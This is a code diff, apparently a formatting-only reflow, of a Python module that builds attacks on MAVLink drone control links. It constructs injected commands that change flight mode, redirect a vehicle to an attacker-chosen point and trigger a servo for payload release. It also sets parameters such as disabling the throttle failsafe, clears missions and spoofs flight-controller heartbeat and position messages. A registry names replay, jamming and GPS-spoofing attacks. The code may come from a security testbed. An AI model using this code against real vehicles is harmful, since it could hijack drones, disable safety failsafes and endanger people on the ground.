@@ -84,11 +84,13 @@ class CommandInjection(LinkAttack):
             return mav2.MAVLink_set_mode_message(1, MAV.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED, int(self.p.get("mode", 5)))
         if kind == "position_target":  # redirect the vehicle to an attacker-chosen point
             n, e, alt = self.p.get("target_ned", [80.0, 80.0, 20.0])
-            return mav2.MAVLink_set_position_target_local_ned_message(0, 1, 1, MAV.MAV_FRAME_LOCAL_NED, 0x0DF8,
-                                                                      n, e, -alt, 0, 0, 0, 0, 0, 0, 0, 0)
+            return mav2.MAVLink_set_position_target_local_ned_message(
+                0, 1, 1, MAV.MAV_FRAME_LOCAL_NED, 0x0DF8, n, e, -alt, 0, 0, 0, 0, 0, 0, 0, 0
+            )
         if kind == "set_servo":  # e.g. payload release
-            return mav2.MAVLink_command_long_message(1, 1, MAV.MAV_CMD_DO_SET_SERVO, 0,
-                                                     self.p.get("servo", 9), self.p.get("pwm", 1900), 0, 0, 0, 0, 0)
+            return mav2.MAVLink_command_long_message(
+                1, 1, MAV.MAV_CMD_DO_SET_SERVO, 0, self.p.get("servo", 9), self.p.get("pwm", 1900), 0, 0, 0, 0, 0
+            )
         raise ValueError(kind)
 
     def tick(self, direction, now):
@@ -161,8 +163,9 @@ class ParamTamper(LinkAttack):
         v = self.p.get("variant", "param")
         self.action(variant=v, **({"param": self.p.get("param", "FS_THR_ENABLE")} if v == "param" else {}))
         if v == "param":
-            m = mav2.MAVLink_param_set_message(1, 1, self.p.get("param", "FS_THR_ENABLE").encode(),
-                                               float(self.p.get("value", 0.0)), 9)
+            m = mav2.MAVLink_param_set_message(
+                1, 1, self.p.get("param", "FS_THR_ENABLE").encode(), float(self.p.get("value", 0.0)), 9
+            )
         elif v == "mission_clear":
             m = mav2.MAVLink_mission_clear_all_message(1, 1, 0)
         else:  # ftp_write: CreateFile opcode on an FTP session
@@ -209,8 +212,10 @@ class FcImpersonation(LinkAttack):
             self.done = True
             self.action()
         out = []
-        for m in (mav2.MAVLink_heartbeat_message(2, 3, 81, 0, 4, 3),
-                  mav2.MAVLink_global_position_int_message(0, -353632610, 1491652300, 584000, 20000, 0, 0, 0, 0)):
+        for m in (
+            mav2.MAVLink_heartbeat_message(2, 3, 81, 0, 4, 3),
+            mav2.MAVLink_global_position_int_message(0, -353632610, 1491652300, 584000, 20000, 0, 0, 0, 0),
+        ):
             out.append(m.pack(self.fake))
             self.fake.seq = (self.fake.seq + 1) % 256
         return out
@@ -256,7 +261,14 @@ class GpsDriftNaive(GnssAttack):
         return self.p.get("rate_ms", 1.0) * dt
 
 
-ATTACKS = {"command_injection": CommandInjection, "telemetry_manipulation": TelemetryManipulation,
-           "link_flood": LinkFlood, "param_tamper": ParamTamper, "replay": Replay,
-           "fc_impersonation": FcImpersonation, "jamming": Jamming, "gps_jump": GpsJump,
-           "gps_drift_naive": GpsDriftNaive}
+ATTACKS = {
+    "command_injection": CommandInjection,
+    "telemetry_manipulation": TelemetryManipulation,
+    "link_flood": LinkFlood,
+    "param_tamper": ParamTamper,
+    "replay": Replay,
+    "fc_impersonation": FcImpersonation,
+    "jamming": Jamming,
+    "gps_jump": GpsJump,
+    "gps_drift_naive": GpsDriftNaive,
+}
